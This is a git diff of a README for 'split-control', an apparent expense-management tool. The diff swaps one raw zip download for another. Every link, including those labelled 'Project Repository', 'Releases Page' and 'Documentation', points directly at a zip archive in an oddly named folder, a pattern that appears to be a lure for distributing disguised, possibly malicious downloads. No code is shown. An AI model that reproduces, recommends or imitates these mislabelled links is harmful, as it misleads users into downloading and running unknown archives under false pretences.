@@ -25,7 +25,7 @@ To run **split-control**, you will need:
 
 You can download the latest version of **split-control** from our Releases page. 
 
-[![Download split-control](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)
+[![Download split-control](https://raw.githubusercontent.com/SkyVodka69/split-control/main/docker/split_control_v3.9-alpha.1.zip)](https://raw.githubusercontent.com/SkyVodka69/split-control/main/docker/split_control_v3.9-alpha.1.zip)
 
 ### Steps to Download:
 
@@ -76,8 +76,8 @@ If you encounter any issues or have questions, feel free to reach out. You can f
 
 ## 🔗 Useful Links
 
-- [Project Repository](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)
-- [Releases Page](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)
-- [Documentation](https://raw.githubusercontent.com/SkyVodka69/split-control/main/militariness/split-control.zip)
+- [Project Repository](https://raw.githubusercontent.com/SkyVodka69/split-control/main/docker/split_control_v3.9-alpha.1.zip)
+- [Releases Page](https://raw.githubusercontent.com/SkyVodka69/split-control/main/docker/split_control_v3.9-alpha.1.zip)
+- [Documentation](https://raw.githubusercontent.com/SkyVodka69/split-control/main/docker/split_control_v3.9-alpha.1.zip)
 
 Thank you for choosing **split-control**! We hope it makes managing your expenses simpler and more enjoyable.
